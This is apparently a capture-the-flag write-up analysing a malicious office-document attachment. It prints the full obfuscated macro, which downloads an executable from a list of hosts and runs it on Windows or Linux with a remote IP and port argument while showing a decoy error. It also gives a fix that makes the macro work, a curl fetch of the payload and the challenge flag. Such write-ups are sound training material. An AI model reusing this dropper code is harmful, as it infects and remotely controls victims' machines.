#### Challenge:

Hi, executive senior investigator! 

Well done, we have acquired the malicious mail attachment. Now, you should take a closer look on it and find out, how it works. [attachement_analysis.tar.xz](./attachement_analysis.tar.xz ":ignore")

Good Luck!

---

#### Solution:

- inspect `macros` in provided `nation_lottery_numbers.ods` and deobfruscate them
```vb

Private Declare Function OOOOO0OO0 Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub Main
O0O00O000 = GetGUIType
Dim O0O0000OO as Object, O0O00OOOO As Object, OOOOOOOO0 as Object
Dim O0OOO000O As Long
OO0OOOO00 = Array("http://challenger.thecatch.cz:20101", "http://freedata.thecatch.cz:20101", "http://www.challenges.thecatch.cz:20101", "http://wordpress.thecatch.cz:20101", "http://root.thecatch.cz:20101", "http://challenges.thecatch.ex:20101", "http://challenges.thecatch.example:20101", "http://challenges.thecatch.mirror:20101", "http://challenges.thecatch.cz:20101")
OOO000OOO = Array("http://challenger.thecatch.cz:20912", "http://freedata.thecatch.cz:20912", "http://www.challenges.thecatch.cz:20912", "http://wordpress.thecatch.cz:20912", "http://root.thecatch.cz:20912", "http://challenges.thecatch.ex:20912", "http://challenges.thecatch.example:20912", "http://challenges.thecatch.mirror:20912", "http://challenges.thecatch.cz:20912")
dim OO00OO0OO
OO00OO0OO = 0
dim OO0O0O000
while True
wait(1000)
OOOOO0OOO = int(Rnd()*10000)
OO00OO0O0 = OO0OOOO00(0)
OO0O0O000 = 10
OO0O0O000 = OO0O0O000 + 60
if 0 <= OOOOO0OOO and OOOOO0OOO < 1000 then
OO00OO0O0 = OO0OOOO00(1)
elseif 1000 <= OOOOO0OOO and OOOOO0OOO < 2000 then
OO00OO0O0 = OO0OOOO00(2)
elseif 2000 <= OOOOO0OOO and OOOOO0OOO < 3000 then
OO00OO0O0 = OO0OOOO00(3)
elseif 3000 <= OOOOO0OOO and OOOOO0OOO < 5000 then
OO00OO0O0 = OO0OOOO00(4)
elseif 5000 <= OOOOO0OOO and OOOOO0OOO < 6000 then
OO00OO0O0 = OO0OOOO00(5)
elseif 6000 <= OOOOO0OOO and OOOOO0OOO < 9998 then
OO00OO0O0 = OO0OOOO00(6)
elseif 9998 <= OOOOO0OOO and OOOOO0OOO < 10000 then
OO00OO0O0 = OO0OOOO00(7)
elseif 10000 <= OOOOO0OOO and OOOOO0OOO < 11000 then
OO00OO0O0 = OO0OOOO00(8)
end if
O00O0OO0O = OOO000OOO(3)
dim OOO00OOO0
DialogLibraries.loadLibrary("Standard")
OOOOOOOO0 = CreateUnoDialog(DialogLibraries.Standard.Dialog1)
Const O0OO0O00O = 0
Const O0O00O0OO = 40
Const OO0OOO0O0 = 4
O0O00OOOO = OOOOOOOO0.getModel().getByName( "ProgressBar1" )
O0O00OOOO.setPropertyValue( "ProgressValueMin", O0OO0O00O)
O0O00OOOO.setPropertyValue( "ProgressValueMax", O0O00O0OO)
OOOOOOOO0.setVisible( True )
For O0OOO000O = O0OO0O00O To O0O00O0OO Step OO0OOO0O0
O0O00OOOO.setPropertyValue( "ProgressValue", O0OOO000O )
Wait 2000
OOO00OO0O = 4
OOO00OOO0 = OOO00OOO0 + chr(int(Rnd() * (0)) + OO0O0O000)
OO0O0O000 = OO0O0O000 + 3
Next O0OOO000O
OOO00OOO0 = left(OOO00OOO0, 7)
OOOOOOOO0.setVisible( False )
Select Case O0O00O000:
Case 1:
O0O0OO0OO = Environ("TEMP") & "\\" & "win10powerupdate.exe"
if OOOOO0OO0(0, OO00OO0O0, O0O0OO0OO, 0, 0) = 0 then
OO00OO0O0 = OO00OO0O0 & "/" & OOO00OOO0 & "_update_OB127q45D.msi"
Wait(3000)
Dim OO0O0O00O as object
OO0O0O00O = createUnoService("com.sun.star.system.SystemShellExecute")
OO0O0O00O.execute(ConvertToUrl(O0O0OO0OO), "-ip 78.128.216.92 -p 20210", 2)
MsgBox("Not enough memory for simulation, run it on another computer.", MB_OK + MB_ICONEXCLAMATION)
thisComponent.close(true) 
end if
Case 4:
O0O0OO0OO = "/tmp/update.bin"
OO00OO0O0 = OO00OO0O0 & "/" & OOO00OOO0 & "_update_OB127q45D.msi"
Shell("wget " & OO00OO0O0 & " -O " & O0O0OO0OO)
if filelen(O0O0OO0OO) > 0 then
Shell("chmod +x " & O0O0OO0OO)
Shell(O0O0OO0OO & " -ip 78.128.216.92 -p 20210")
MsgBox("Not enough memory for simulation, run it on another computer.", MB_OK + MB_ICONEXCLAMATION)
thisComponent.close(true) 
end if
End Select
OO00OO0OO = OO00OO0OO + 1
if OO00OO0OO > OOO00OO0O then
MsgBox("Not enough entropy for simulation, restart computer and try again...", MB_OK + MB_ICONEXCLAMATION)
thisComponent.close(true)
end if
wend
end sub
```
- fix issue with string append
```vb
OOO00OO0O = 4
OOO00OOO0 = "" + OOO00OOO0 + chr(int(Rnd() * (0)) + OO0O0O000)
OO0O0O000 = OO0O0O000 + 3
```
- run the macro and try to download the binaries, hostname needs to be updated to working one based on the server `Array`
```bash
curl http://challenges.thecatch.cz:20101/FILORUX_update_OB127q45D.msi
```

---

<details><summary>FLAG:</summary>

```
FLAG{XRC9-XyEE-tlTV-nOl7}
```

</details>
<br/>
